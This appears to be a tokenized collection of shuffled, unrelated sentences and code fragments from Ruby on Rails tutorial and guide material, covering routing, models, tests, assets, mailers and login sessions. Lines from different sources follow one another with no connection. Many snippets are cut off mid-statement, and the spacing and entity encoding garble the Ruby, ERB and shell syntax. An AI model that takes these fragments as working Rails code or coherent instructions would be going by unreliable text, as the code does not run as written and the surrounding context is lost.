Having verified by hand that the application is behaving properly upon successful login , before moving on we &apos;ll write an integration test to capture that behavior and catch regressions .
create db / migrate / &#91; timestamp &#93; _ create _ blorgh _ articles ▖ rb
There &apos;s just one small problem , the caveat alluded to above :
( Session hijacking was widely publicized by the \ href { http : / / codebutler ▖ com / firesheep } { Firesheep } application , which showed that remember tokens at many high-profile sites were visible when connected to public Wi-Fi networks .
We start with a request issued from the browser---i ▖ e ▖ , the result of typing a URL in the address bar or clicking on a link ( Step ~ 1 in Figure ~ \ ref { fig : mvc _ detailed } ) .
( Don &apos;t worry about what the \ kode { -u } flag does ; if you &apos;re curious , do a web search for ``git set upstream &apos; &apos; ▖ )
Note that , in Table ~ \ ref { table : valid _ email _ regex } , ``letter &apos; &apos; really means ``lower-case letter &apos; &apos; , but the \ kode { i } at the end of the regex enforces case-insensitive matching .
create test / fixtures / microposts ▖ yml
The `limit` method lets you restrict the total number of objects that will be fetched through an association .
The changes in this section should be made on the master branch :
{ start _ date : params &#91; : start _ date &#93; , end _ date : params &#91; : end _ date &#93; } )
You can redirect any path to another path using the `redirect` helper in your router :
# Sign in when not using Capybara .
Next , you have to tell Rails where your actual home page is located .
You can supply a ` : method` argument to specify the HTTP verb :
The method `welcome _ email` returns a `ActionMailer : : MessageDelivery` object which ╼ can then just be told `deliver _ now` or `deliver _ later` to send itself out ▖
By definition , an object is valid if this collection is empty after running ╼ validations .
Please consult the RDoc documentation for help with the ╼ &#91; markup &#93; ( http : / / docs ▖ seattlerb ▖ org / rdoc / RDoc / Markup ▖ html ) , ╼ and also take into account these &#91; additional ╼ directives &#93; ( http : / / docs ▖ seattlerb ▖ org / rdoc / RDoc / Parser / Ruby ▖ html ) .
The alternative is to use `try` ▖ `try` is like `Object # send` except that it returns `nil` if sent to `nil` .
A newline is what comes at the end of a line , thereby starting a new line .
Inside the test directory there is the `test / integration` directory , where ╼ integration tests for the engine should be placed ▖
In production , ╼ Rails inserts an MD5 fingerprint into each filename so that the file is cached ╼ by the web browser ▖
Besides that , one can use `deep _ stringify _ keys` and `deep _ stringify _ keys ! ` to stringify all the keys in the given hash and all the hashes nested into it ▖
Ensuring email uniqueness by downcasing the email attribute ▖
A model for user followers through passive relationships .
belongs _ to Association Diagram &#93; ( images / belongs _ to ▖ png )
Say for example we are at the end of February of 2010 , and we want to move one month and one day forward .
description : email ▖ subject
Among other features , the cloud IDE text editor supports the ``Find in Files &apos; &apos; global search that I consider essential to navigating any large Ruby or Rails project
# # # # image _ tag
This might involve adding an \ kode { in \ _ reply \ _ to } column in the \ kode { microposts } table and an extra \ kode { including \ _ replies } scope to the Micropost model .
= = CreateMicroposts : migrated ( 0 ▖ 0026s ) = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = =
# = &gt; # &lt; Client id : 10 , first _ name : &quot; Ryan &quot; &gt;
Produce a string representation of a number as a human-readable number of bytes :
And , as you might suspect by now , there are RailsCasts on many scaling subjects , including profiling , caching , and background jobs .
You can read more about these in the &#91; Asset Pipeline &#93; ( asset _ pipeline ▖ html ) guide .
instead by passing in the appropriate parameter to \ kode { authenticated ? } .
# # # Access
The view for the Home page with an embedded Ruby title ▖
&lt; li &gt; &lt; % = msg % &gt; &lt; / li &gt;
installs the latest version of the \ kode { uglifier } gem ( which handles file compression for the asset pipeline ) as long as it &apos;s greater than or equal to version ~ \ kode { 1 ▖ 3 ▖ 0 } ---even if it &apos;s , say , version ~ \ kode { 7 ▖ 2 } .
* You may be doing frequent deploys that do not include asset changes .
Locking is helpful for preventing race conditions when updating records in the database and ensuring atomic updates .
validates : title , length : { is : 5 } , allow _ blank : true
To test micropost pagination , we &apos;ll also generate some additional micropost fixtures using the same embedded Ruby technique we used to make additional users in Listing ~ \ ref { code : users _ fixtures _ extra _ users } :
Our goal now is to write tests for the right behavior given invalid and valid signup information .
* No trailing whitespace ▖
Ensuring that a User object has a \ kode { password \ _ digest } column .
&#124; &#124; 428 &#124; : precondition _ required &#124;
For example , here &apos;s some code that will trigger this error :
As with the forthcoming sample application , the demo app will consist of \ emph { users } and their associated \ emph { microposts } ( thus constituting a minimalist Twitter-style app ) .
$ git remote add JohnSmith git : / / github ▖ com / JohnSmith / rails ▖ git
As a result ,
The Purpose of the Rails Router
In this chapter , we &apos;ve hammered our application layout into shape and polished up the routes .
match &apos; photos &apos; , to : &apos; photos # show &apos; , via : &#91; : get , : post &#93;
m = Object ▖ send ( : remove _ const , : M )
@ comment = @ article ▖ comments ▖ create ( comment _ params )
update user
The appearance of a link to the profile page
With unique remember tokens , an attacker always needs \ emph { both } the user id and the remember token cookies to hijack the session .
In all three cases , observe that each micropost display indicates the time since it was created ( e ▖ g ▖ , ``Posted 1 minute ago ▖ &apos; &apos; ) ; this is the work of the \ kode { time \ _ ago \ _ in \ _ words } method from Listing ~ \ ref { code : micropost _ partial } .
╼ To get help on this sample app , see the
# # # Configuring a Database
# = &gt; TokenGenerationException : Token can &apos;t be blank
The cache is even shared across methods ▖
token , options = token _ and _ options ( controller ▖ request )
# Now your job will run on queue production _ low _ priority on your
Here we are using the \ kode { upcase } method on strings ( seen briefly in Section ~ \ ref { sec : blocks } ) .
Migrations
We &apos;ve covered the &quot; CR &quot; part of CRUD ▖
Tests for an \ kode { admin } attribute .
For example , if you take a look back at Figure ~ \ ref { fig : editor _ shell } , you &apos;ll see a small vertical line on the right to help keep code under 80 characters .
( You can also verify by removing the \ kode { authenticated ? } \ expression in Listing ~ \ ref { code : branch _ no _ raise } that the second test in Listing ~ \ ref { code : persistent _ sessions _ test } fails , which confirms that it tests the right thing ▖ )
# No surname instance reader or surname = writer is generated .
class Player &lt; ActiveRecord : : Base
Because \ kode { @ name } and \ kode { @ email } are both instance variables ( as indicated with the ~ \ kode { @ } sign ) , they are automatically available in the \ kode { formatted \ _ email } method .
# This is preliminary .
&quot; Betelgeuse ! &quot;
For example , the \ href { https : / / github ▖ com / rails / rails / blob / master / activemodel / lib / active _ model / secure _ password ▖ rb } { source code } of \ kode { has \ _ secure \ _ password } makes this mistake , as did the first two editions of this tutorial .
As with any refactoring , you should verify that the test suite is still \ passing \ after changing the application code :
C ▖ x = : c
* `config ▖ action _ controller ▖ asset _ host` sets the host for the assets ▖
For brevity , when referring to the file
As you probably suspect , we will not be making a whole database table just to hold reverse relationships .
Assigning an object to a `belongs _ to` association does _ not _ automatically save the object ▖
# is enabled by default .
A test for friendly forwarding ▖
We can render the footer partial in the layout by following the same pattern as the stylesheets and header partials ( Listing ~ \ ref { code : layout _ with _ footer } ) .
The `has _ one` relationship says that one of something is yours - that is , that something points back to you ▖
# # # # `append`
Adding a test for the signup page is left as an exercise ( Section ~ \ ref { sec : layout _ exercises } ▖ )
You &apos;ll learn a little about associations in the next section of this guide .
RESTful routes provided by the Microposts resource in Listing ~ \ ref { code : demo _ microposts _ resource } .
create app / helpers / users _ helper ▖ rb
Logging out from a persistent session .
if @ supplier ▖ account ▖ nil ?
For brevity , throughout the rest of this tutorial I &apos;ll use \ kode { subl } as a shorthand for ``open with your favorite text editor ▖ &apos; &apos;
&quot; Admin : : Session &quot; ▖ foreign _ key # = &gt; &quot; session _ id &quot;
The max pool size is currently 5 ; consider increasing it :
The password reset HTML email template .
Within the block of member routes , each route name specifies the HTTP verb ╼ will be recognized ▖
To get the production site working , we have to commit the change to the configuration file and push the result up to Heroku :
* `before _ enqueue`
Once the image has been uploaded , we can render it using the \ kode { image \ _ tag } helper in the micropost partial , as shown in Listing ~ \ ref { code : micropost _ partial _ image _ display } .
To quickly generate this , you can use the Rails scaffold generator .
Here is an example :
The `collection _ singular _ ids` method returns an array of the ids of the objects in the collection .
as shown in Listing ~ \ ref { code : destroy _ session } .
Then we &apos;ll add a very small amount of dynamic content by changing the title on a per-page basis .
in Listing ~ \ ref { code : relationships _ controller _ ajax } .
For example , given the declaration :
Object ▖ qualified _ const _ get ( &quot; Math : : PI &quot; ) # = &gt; 3 ▖ 141592653589793
Client ▖ joins ( &apos; LEFT OUTER JOIN addresses ON addresses ▖ client _ id = clients ▖ id &apos; )
Rails infers the names of the foreign keys from the corresponding symbols ( i ▖ e ▖ , \ kode { follower \ _ id } from \ kode { : follower } , and \ kode { followed \ _ id } from \ kode { : followed } ) , but since there is neither a Followed nor a Follower model we need to supply the class name \ kode { User } .
The solution involves our first example of \ emph { metaprogramming } , which is essentially a program that writes a program .
* A namespaced `ApplicationHelper` stub
For the &quot; blorgh &quot; example , you will need to ╼ create a &quot; mountable &quot; engine , running this command in a terminal :
When using the ` : json` or ` : hybrid` serializer , you should beware that not all ╼ Ruby objects can be serialized as JSON ▖ For example , `Date` and `Time` objects ╼ will be serialized as strings , and `Hash`es will have their keys stringified .
name : &#91; &apos; John &apos; , &apos; Sergei &apos; &#93; )
The purpose is to get a high-level overview of Ruby on Rails programming ( and web development in general ) by rapidly generating an application using \ emph { scaffold generators } , which create a large amount of functionality automatically .
# Original query without `unscope`
C ▖ x # = &gt; : b
# = &gt; &lt; input id = &quot; pass &quot; name = &quot; pass &quot; type = &quot; password &quot; / &gt;
to express the expectation of seeing an error message , and
&quot; foo &quot; ▖ indent ( 2 , &quot; \ t &quot; ) # = &gt; &quot; \ t \ tfoo &quot;
user ▖ destroy
in Listing ~ \ ref { code : add _ remember _ token _ to _ users } .
binstubs
Inspecting the state of the system using \ texttt { byebug } is a powerful method for tracking down application errors and interactively debugging your application .
included do
Email settings in development .
The result of the CSS in Listing ~ \ ref { code : universal _ css } is shown in Figure ~ \ ref { fig : sample _ app _ universal } .
\ href { http : / / mbsy ▖ co / 6VQ8l } { Code School } : A large variety of interactive programming courses
# = &gt; &#91; &#91; 0 &#93; , &#91; -5 &#93; , &#91; &#93; , &#91; &quot; foo &quot; , &quot; bar &quot; &#93; &#93;
in Listing ~ \ ref { code : rspec _ utilities _ simplified } .
nick ▖ new _ record ?
# # # Configuring Middleware Stack
Before moving on , if you &apos;re using Git it &apos;s a good idea to add the files for the Static Pages controller to the remote repository :
= &gt; false
The test suite should be \ passing :
# # # Precompiling Assets
This link is then processed by the Sprockets gem ▖
Suppose you want to find a client named &apos; Andy &apos; , and if there &apos;s none , create one ▖
class BlacklistConstraint
The method `humanize` tweaks an attribute name for display to end users .
# # # Association Extensions
pulls \ emph { all } the followed users &apos; ids into memory , and creates an array the full length of the followed users array .
This is because \ kode { rails new } generates single-quoted strings , whereas the \ href { https : / / github ▖ com / kern / minitest-reporters } { MiniTest reporters documentation } uses double-quoted strings .
which ( as described in the \ href { http : / / api ▖ rubyonrails ▖ org / v4 ▖ 0 ▖ 0 / classes / ActiveModel / Validations / HelperMethods ▖ html # method-i-validates _ confirmation _ of } { Rails API } ) automagically creates an attribute called \ kode { password \ _ confirmation } .
Amazingly , Ruby lets you do just this ; Ruby classes can be \ emph { opened } and modified , allowing ordinary mortals such as ourselves to add methods to them
A preview of text version the account activation email .
For example , consider a hash named \ kode { flash } with keys for two conditions , \ kode { : success } and \ kode { : danger } :
Getting the initial password tests to pass .
# # # form _ tag
30 ▖ ▖ 50 ) # = &gt; false
Mockups matching these requirements appear in Figure ~ \ ref { fig : following _ mockup } ( following ) and Figure ~ \ ref { fig : followers _ mockup } ( followers ) .
The following methods are only implemented in `active _ support / core _ ext / date _ time / calculations ▖ rb` as they only make sense when used with a `DateTime` instance :
Note that the \ kode { src } attribute \ emph { doesn &apos;t } include \ kode { images } , instead using an \ kode { assets } directory common to all assets ( images , JavaScript , CSS , etc ▖ ) .
email = michael % 40michaelhartl ▖ com ╼ ---- = = _ mimepart _ 5407704656b50 _ 61d3fd1914f4cd02996a ╼ Content-Type : text / html ; ╼ charset = UTF-8 ╼ Content-Transfer-Encoding : 7bit ╼ ╼ &lt; h1 &gt; Sample App &lt; / h1 &gt; ╼ ╼ &lt; p &gt; Hi Michael Hartl , &lt; / p &gt; ╼ ╼ &lt; p &gt; ╼ Welcome to the Sample App !
can be tested using the RSpec code
The default is true .
For example , you ╼ might concatenate three CSS files together this way :
This behavior makes debugging easier by avoiding silent errors .
╼ end
@ article = Article ▖ find ( params &#91; : id &#93; )
= &gt; &quot; development &quot;
The capitalization of the first word can be turned off by setting the ╼ + : capitalize + option to false ( default is true ) .
t ▖ boolean : single _ issue
After the cookies are set , on subsequent page views we can retrieve the user with code like
The optional fourth line is included so that you can use \ kode { co } in place of the more verbose \ kode { checkout } command .
The default tests for the StaticPages controller ▖
Additionally , options passed to this can be configured by using `config ▖ action _ controller ▖ session _ options` .
Imagine a blacklist deletes &quot; script &quot; from the user input ▖
Rails Routing from the Outside In
= &gt; &#91; 42 , 8 , 17 , 6 , 7 &#93;
Once you &apos;ve placed your assets in their logical locations , you can use \ emph { manifest files } to tell Rails ( via the \ href { https : / / github ▖ com / rails / sprockets } { Sprockets } gem ) how to combine them to form single files .
In Ruby 1 ▖ 9 `prev _ month` and `next _ month` return the date with the same day in the last or next month :
╼ &gt; &gt; @ user
Ensuring that a user &apos;s microposts are destroyed along with the user .
( Note that , in contrast to the plural convention for controller names , model names are singular : a \ emph { Users } controller , but a \ emph { User } model ▖ )
&lt; / tr &gt;
# The module object is orphan now but it still has a name .
Recalling the \ emph { or } ~ operator \ texttt { &#124; &#124; } seen in Section ~ \ ref { sec : objects _ and _ message _ passing } , we can write this as follows :
No security
3 ▖ ▖ 7 ) # = &gt; true
Rails automatically converts this to the route for the user &apos;s profile page :
The micropost index page ( \ href { http : / / localhost : 3000 / microposts } { / microposts } ) ▖ ~ \ href { http : / / railstutorial ▖ org / images / figures / demo _ micropost _ index _ rails _ 3-full ▖ png } { ( full size ) }
* `action _ mailer ▖ set _ configs` Sets up Action Mailer by using the settings in `config ▖ action _ mailer` by `send` &apos; ing the method names as setters to `ActionMailer : : Base` and passing the values through .
There are many ways to test for the result of an expiration , but the method suggested by Listing ~ \ ref { code : password _ reset _ expire _ test } is to ( case-insensitively ) check that the response body includes the word ``expired &apos; &apos; .
* `controls : true` , provides browser supplied controls for the user to interact with the audio .
Instead of :
* : through
Verify by running the test suite that the cleaner code in Listing ~ \ ref { code : layout _ flash _ content _ tag } , which uses the Rails \ kode { content \ _ tag } helper , also works .
Rails also supports MySQL and PostgreSQL &quot; out of the box &quot; , and has plugins for many database systems ▖
3 ▖ ▖ 11 ) # = &gt; false
These are useful for upload validations , making it easy to restrict , say , image uploads to \ texttt { 5 ▖ megabytes } .
If you would like to only grab a single record per unique value in a certain field , you can use `distinct` :
When constructing a form using \ kode { form \ _ for ( @ user ) } , Rails uses \ texttt { POST } if \ kode { @ user ▖ new \ _ record ? } \ is \ kode { true } and \ texttt { PATCH } if it is \ kode { false } .
In each case , the pattern is that \ texttt { x = x O y } and \ texttt { x O = y } are equivalent for any operator \ texttt { O } .
Next , the `test _ unit` generator is invoked for this model , generating a model ╼ test at `test / models / blorgh / article _ test ▖ rb` ( rather than ╼ `test / models / article _ test ▖ rb` ) and a fixture at `test / fixtures / blorgh / articles ▖ yml` ╼ ( rather than `test / fixtures / articles ▖ yml` ) .
Rails allows you to customize virtually any generic part of the resourceful helpers .
# # # Adding Elements
You can learn more about migrations in the ╼ &#91; Active Record Migrations guide &#93; ( migrations ▖ html ) .
( An error will appear in the Rails log , but that doesn &apos;t do any harm .
The following sections give the details of each type of association , including the methods that they add and the options that you can use when declaring an association .
* `config ▖ asset _ host` sets the host for the assets ▖
Next , we need a test to capture the sequence shown in Figure ~ \ ref { fig : failed _ login _ flash _ 3rd _ edition } and Figure ~ \ ref { fig : flash _ persistence _ 3rd _ edition } .
It &apos;s easier to describe what objects \ emph { do } , which is respond to messages .
d ▖ beginning _ of _ month # = &gt; Sat , 01 May 2010
create app / views / static _ pages
* `ActionDispatch : : SSL` forces every request to be under HTTPS protocol ▖
Let us also move that new comment section out to its own partial ▖
NOTE : Only the directory notation is supported ▖
To use this method , add this code into ╼ `app / views / articles / new ▖ html ▖ erb` :
&lt; div &gt;
* `config ▖ action _ controller ▖ relative _ url _ root` can be used to tell Rails that you are &#91; deploying to a subdirectory &#93; ( configuring ▖ html # deploy-to-a-subdirectory-relative-url-root ) ▖
You should verify at this point that the test suite is red :
\ href { http : / / michaelhartl ▖ com / } { Michael Hartl } is the author of the \ href { http : / / ruby ▖ railstutorial ▖ org / } { \ emph { Ruby on Rails Tutorial } } , the leading introduction to web development with \ href { http : / / rubyonrails ▖ org / } { Ruby on Rails } .
mail ▖ delivery _ method ▖ settings ▖ merge ! (
Defaults to `nil` , which means `active _ support / all` is loaded .
Can you think of a nicer or faster way to implement a part of their change ?
In order to validate associated records whose absence is required , you must ╼ specify the ` : inverse _ of` option for the association :
43 , 44 , 45 , 46 , 47 , 48 , 49 , 50 , 51 &quot;
* ` : nullify` causes the foreign keys to be set to `NULL` ▖
&lt; h3 &gt; Comments &lt; / h3 &gt;
`camelize` is aliased to `camelcase` .
The console is a great learning tool , and you should feel free to explore---don &apos;t worry , you ( probably ) won &apos;t break anything .
╼ end
* `config ▖ action _ mailer ▖ raise _ delivery _ errors` specifies whether to raise an error if email delivery cannot be completed ▖
The \ kode { bundle } command by itself is an alias for \ kode { bundle install } .
The generated account activation HTML view .
These posts only appear in the feed of the user in question or users following that user .
In fact , this set can be any enumerable object .
-b updating-users ╼ \ end { code } ╼ ╼ \ subsection { Edit form } % ( fold ) ╼ \ label { sec : edit _ form } ╼ ╼ We start with the edit form , whose mockup appears in Figure ~ \ ref { fig : edit _ user _ mockup } ▖ \ footnote { Image retrieved
For bigger sites , you would probably need to generate the feed asynchronously using a background job , but such scaling subtleties are beyond the scope of this tutorial .
&lt; % if @ customer ▖ orders ▖ empty ?
When creating a column in a database , it is important to consider whether we will need to \ emph { find } records by that column .
The rules in Listing ~ \ ref { code : guardfile } are optimized for this tutorial , automatically running ( for example ) the integration tests when a controller is changed .
* X-XSS-Protection
This order is relevant , a different ordering would give different datetimes in some edge-cases ▖
These helpers provide common validation ╼ rules ▖
* `config ▖ i18n ▖ load _ path` sets the path Rails uses to look for locale files ▖
This helper validates that the attributes &apos; values are not included in a given ╼ set ▖
A test for a valid signup ▖
def welcome _ email ( user )
Creates a radio button ; use groups of radio buttons named the same to allow users to select from a group of options .
* `config ▖ active _ record ▖ primary _ key _ prefix _ type` lets you adjust the naming for primary key columns ▖
queue _ as : low _ priority
What &apos;s more , depending on the application , that may be a big security hole because users can inject malicious HTML setting a hand-crafted review title ▖
By including the extra \ kode { count : 0 } option , we tell \ kode { assert \ _ select } that we expect there to be zero links matching the given pattern .
&#124; GET &#124; / photos / : id / edit &#124; photos # edit &#124; return an HTML form for editing a photo &#124;
Validating the presence of a \ kode { name } attribute ▖
This means that there &apos;s only one constraint left : enforcing email uniqueness .
The result appears in Listing ~ \ ref { code : signup _ form }
Most of the work in this tutorial will ╼ happen in the `app` folder , but here &apos;s a basic rundown on the function of each ╼ of the files and folders that Rails created by default :
# &lt; message &gt; Kill AMo observing wrap _ with _ notifications since ARes was only using it &lt; / message &gt;
The model here is also namespaced , ╼ being placed at `app / models / blorgh / article ▖ rb` rather than `app / models / article ▖ rb` due ╼ to the `isolate _ namespace` call within the `Engine` class .
# # # # # ` : primary _ key`
After upgrading to Rails 4 ▖ 0 , helpers will preserve the order of loaded directories and will be sorted alphabetically only within each directory ▖
As shown in Listing ~ \ ref { code : home _ root _ route } , this means replacing the generated \ kode { get } rule from Listing ~ \ ref { code : pages _ routes } with the following code :
* Rails 4 ▖ 0 has changed `serialized _ attributes` and `attr _ readonly` to class methods only ▖
When modeling longer posts , such as those for a normal ( non-micro ) blog , you should use the \ kode { text } type in place of \ kode { string } .
end ▖ bind ( object )
There &apos;s also the destructive version `String # squish ! ` .
Article ▖ where ( published : true ) ▖ many ?
mail
With the configuration above , we are ready to commit our changes and deploy .
Because the application code was working , the test suite should be \ passing :
C ▖ x # = &gt; : a
Now what if that number could vary , say as an argument from somewhere ?
{ &quot; files &quot; : { &quot; application-723d1be6cc741a3aabb1cec24276d681 ▖ js &quot; : { &quot; logical _ path &quot; : &quot; application ▖ js &quot; , &quot; mtime &quot; : &quot; 2013-07-26T22 : 55 : 03-07 : 00 &quot; , &quot; size &quot; : 302506 ,
We &apos;ll develop the sample app using a combination of \ emph { mockups } , \ emph { test-driven development } ( TDD ) , and \ emph { integration tests } .
Returns an input tag of the &quot; date &quot; type tailored for accessing a specified attribute .
You can even run the generator repeatedly : `cd ▖ ▖ &amp; &amp; rails new blog --database = mysql` ▖
The above discussion suggests putting the digest--token comparison into an \ kode { authenticated ? } \ method in the User model , which plays a similar role to the \ kode { authenticate } method provided by \ kode { has \ _ secure \ _ password } for authenticating a user ( Listing ~ \ ref { code : log _ in _ success } ) .
Earlier versions of Rails used \ texttt { PUT } for data updates , but \ texttt { PATCH } is the more appropriate method according to the HTTP standard .
So , what does a view look like , and how do we find it ?
Error message from submitting the update form .
format ▖ json _ patch do
There are also two common ways to specify a gem version range , which allows us to exert some control over the version used by Rails .
# # # Setting the Application Home Page
╼ * This is a manifest file that &apos;ll automatically include all the stylesheets
The \ kode { current \ _ user ? } \
It does so by sending `to _ sym` to them :
WARNING : If you specify your own `select` , be sure to include the primary key and foreign key columns of the associated model ▖
When submitting invalid data , we expect the user count not to change ; when submitting valid data , we expect it to change by 1 .
* `asset-url ( &quot; rails ▖ png &quot; ) ` becomes `url ( / assets / rails ▖ png ) `
If your development computer &apos;s MySQL installation includes a root user with an empty password , this configuration should work for you ▖
&quot; TrueClass &quot; = &gt; &quot; boolean &quot; ,
&lt; % = comment _ counter + 1 % &gt; ▖ &lt; % = comment ▖ text % &gt;
In other words , inside the \ kode { create } action the \ kode { params } hash has all the information needed to authenticate users by email and password .
Below table shows what the parameters look like based on `JSON` sent in ╼ request :
In Chapter ~ \ ref { cha : user _ microposts } , the result was only a proto-feed ( Figure ~ \ ref { fig : home _ with _ proto _ feed } ) , but with the implementation in Listing ~ \ ref { code : feed _ final } as seen in Figure ~ \ ref { fig : home _ page _ with _ feed } the Home page now shows the full feed .
When you open ╼ `http : / / localhost : 3000 / blorgh / articles` you will see the default scaffold that has ╼ been generated ▖
the request is dispatched to the `patients` controller &apos;s `show` action with ` { id : &apos; 17 &apos; } ` in `params` .
The ` : as` option overrides the automatically-generated name for the resource in nested route helpers ▖
With the code in Listing ~ \ ref { code : mail _ password _ reset } , Listing ~ \ ref { code : password _ reset _ text } , and Listing ~ \ ref { code : password _ reset _ html } , submission of a valid email address appears as shown in Figure ~ \ ref { fig : valid _ email _ password _ reset } .
Our plan is to store the base64 token on the browser , and then store an encrypted version in the database .
Ideally , Ruby on Rails should issue no warnings , but there may be a few , as well as some from third-party libraries ▖
The second method , `find _ in _ batches` , retrieves a batch of records and then yields _ the entire batch _ to the block as an array of models .
Sprockets uses manifest files to determine which assets to include and serve ▖ ╼
# bundle exec rake doc : rails generates the API under doc / api .
{ nil = &gt; nil , 1 = &gt; 1 , a : : a } ▖ transform _ keys { &#124; key &#124; key ▖ to _ s ▖ upcase }
The last one tells Rails not to deal with sessions ▖
The list is likely to be overwhelming , but don &apos;t worry , you don &apos;t have to know all ( or even most ) of these commands .
&lt; li &gt; ` : domain` - If you need to specify a HELO domain , you can do it here ▖ &lt; / li &gt;
It &apos;s not important to understand the details ( and in fact \ emph { I } don &apos;t know the details offhand ) , but we can infer from the presence of the \ kode { do } keyword that the body of the test is a block .
The proposed extensions in this section are mostly inspired either by general features common to web applications , such as password reminders and email confirmation , or features specific to our type of sample application , such as search , replies , and messaging .
* `image-url ( &quot; rails ▖ png &quot; ) ` becomes `url ( / assets / rails ▖ png ) `
t ▖ string : commenter
In case you can &apos;t use the Rails development box , see &#91; this other guide &#93; ( development _ dependencies _ install ▖ html ) .
# # # # Loading All Core Extensions
As in the case of creating users ( signup ) , the first step in creating sessions ( login ) is to handle \ emph { invalid } input .
With this technique in hand , we &apos;re ready to write some basic email format validation tests .
We &apos;ll eliminate them in Section ~ \ ref { sec : professional _ grade _ deployment } ▖ )
We begin with tests for displaying the user &apos;s microposts , which we &apos;ll create in the request spec for Users .
now ▖ seconds _ since _ midnight # = &gt; 73596
The selects are prepared for multi-parameter assignment to an Active Record object .
# # # # `instance _ variable _ names`
On some systems , you may have to scroll past the ``stack trace &apos; &apos; or ``backtrace &apos; &apos; that traces the error &apos;s path through the source code .
# # # PostgreSQL json and hstore datatypes
There are two other choices :
To fix this , we &apos;ll begin with a minimalist version of the profile page , which we &apos;ll flesh out in Section ~ \ ref { sec : a _ gravatar _ image } .
The result appears in Listing ~ \ ref { code : utility _ method _ tests }
No custom layout or styling
&lt; option value = &quot; 1 &quot; selected = &quot; selected &quot; &gt; D ▖ Heinemeier Hansson &lt; / option &gt;
This \ kode { index } action has the line \ kode { @ users = User ▖ all } ( Step ~ 3 in Figure ~ \ ref { fig : mvc _ detailed } ) , which asks the User model to retrieve a list of all the users from the database ( Step ~ 4 ) , and then places them in the variable \ kode { @ users } ( pronounced ``at-users &apos; &apos; ) ( Step ~ 5 ) .
Mon , 09 Aug 2010 23 : 59 : 59 UTC + 00 : 00
&lt; % @ books ▖ each do &#124; book &#124; % &gt;
We can express this in RSpec by combining the \ kode { expect } method with either the \ kode { to } method or the \ kode { not \ _ to } method .
config ▖ assets ▖ paths &lt; &lt; Rails ▖ root ▖ join ( &quot; lib &quot; , &quot; videoplayer &quot; , &quot; flash &quot; )
This code verifies that exactly 1 message was delivered .
class Paragraph &lt; ActiveRecord : : Base
A mockup of the login form with such a checkbox appears in Figure ~ \ ref { fig : login _ remember _ me _ mockup } .
Documentation for the application
If you want to find records using the `IN` expression you can pass an array to the conditions hash :
`Rails : : Application` uses `ActionDispatch : : MiddlewareStack` to combine various internal and external middlewares to form a complete Rails Rack application .
The `capture` method allows you to extract part of a template into a variable ▖
This object will be instantiated from the passed attributes , the link through this object &apos;s foreign key will be set , and , once it passes all of the validations specified on the associated model , the associated object _ will _ be saved .
= &gt; # &lt; StaticPagesController : 0x22855d0 &gt;
Then , client code can query for duck-type-safeness this way :
* `config ▖ assets ▖ enabled` a flag that controls whether the asset ╼ pipeline is enabled ▖
Let &apos;s wire up the `create` in `app / controllers / comments _ controller ▖ rb` :
Note that this might cease to work in the future
xml ▖ p ( @ person ▖ bio )
&lt; div id = &quot; content &quot; &gt; &lt; % = content _ for ? ( : content ) ?
/ / = require projects
The error message here says that no route matches the desired action / controller combination , which is a hint that we need to add a line to the routes file .
Next , we &apos;ll use the newly defined named route to add the proper link to the button on the Home page .
( We &apos;ll use this same file in Section ~ \ ref { sec : a _ test _ for _ valid _ submission } to test a valid signup ▖ )
( The code in this file is Ruby , but don &apos;t worry at this point about the syntax ; Chapter ~ \ ref { cha : rails _ flavored _ ruby } will cover Ruby in more depth ▖ )
xml ▖ language &quot; en-us &quot;
If the receiver responds to `convert _ key` keys are normalized :
Finding a user to follow .
We &apos;ll start by refactoring the feed with the slightly modified code in Listing ~ \ ref { code : from _ users _ followed _ by _ second _ cut } .
Having addressed the uniqueness caveat , there &apos;s one more change we need to make to be assured of email uniqueness .
DELETE / photos / 17
The technique involves using \ emph { Embedded Ruby } in our views .
For each route , you &apos;ll see :
Based on the example for the Home page , you can probably guess the analogous test and application code for the Help page .
Even if our code prevents them from submitting it through the web , they could always edit the JavaScript with a web inspector or issue a direct \ texttt { POST } request using , e ▖ g ▖ , \ kode { curl } .
This creates a \ kode { features / } directory where the files associated with Cucumber will live .
For example in
A sketch of the User data model .
In order to get the styling right , though , we have to \ emph { nest } the checkbox inside the label , as follows :
In each case , the \ kode { root } method arranges for the root path / to be routed to a controller and action of our choice .
( The green welcome message is accomplished using the \ emph { flash } , which we &apos;ll learn about in Section ~ \ ref { sec : the _ flash } ▖ )
render file : &quot; / u / apps / warehouse _ app / current / app / views / products / show &quot;
The results of a successful user signup , with flash message .
One nice effect of building the authentication machinery in Chapter ~ \ ref { cha : basic _ login } is that we are now in a position to implement authorization as well .
We can accomplish this in Rails with the \ kode { form \ _ for } helper method , which takes in an Active Record object and constructs a form using the object &apos;s attributes .
&#124; &#124; 303 &#124; : see _ other &#124;
So that , for example , `resource : photo` and `resources : photos` creates both singular and plural routes that map to the same controller ( `PhotosController` ) .
This route will also route the incoming request of ` / photos` to `PhotosController # index` , since ` : action` and ` : id` are optional parameters , denoted by parentheses .
Incredibly , because of all our work in the previous sections , the implementation can be reduced to one line .
The \ href { http : / / gravatar ▖ com / } { Gravatar } image-cropping interface , with a picture of \ href { http : / / michaelhartl ▖ com / } { some dude } .
The code in Listing ~ \ ref { code : demo _ length _ validation } may look rather mysterious---we &apos;ll cover validations more thoroughly starting in Section ~ \ ref { sec : user _ validations } ---but its effects are readily apparent if we go to the new micropost page and enter more than 140 characters for the content of the post .
* `config ▖ active _ support ▖ use _ standard _ json _ time _ format` enables or disables serializing dates to ISO 8601 format ▖
Its return value becomes a new node .
date ▖ years _ ago ( 10 ) # = &gt; Wed , 07 Jun 2000
Then push up to Bitbucket :
Action View and Action Controller are the two major components of Action Pack ▖
create _ table : pictures do &#124; t &#124;
The methods `Range # include ? ` and `Range # = = = ` say whether some value falls between the ends of a given instance :
Rails supports issuing lower-level SQL queries if needed .
The element will be keyed by the value returned by the block :
belongs _ to : supplier ,
Here we &apos;ve also supplied the argument \ kode { password \ _ digest : string } with the name and type of attribute we want to create .
would also work fine , but I prefer the explicitness of the version in Listing ~ \ ref { code : authenticated _ p _ fixed } ( which also happens to be slightly shorter ) .
# # # Using Your Own Compressor
The resulting data model appears in Figure ~ \ ref { fig : user _ model _ admin _ 3rd _ edition } .
Compare these to the microposts count from Listing ~ \ ref { code : user _ show _ microposts } , where we wrote
Finally , deploy to Heroku :
By default , Active Record doesn &apos;t know about the connection between these associations ▖
And the requirement is that `todos` table should hold ╼ `guid` column value and not `id` value ▖
Rails comes with lots of commands that can be run at the command line .
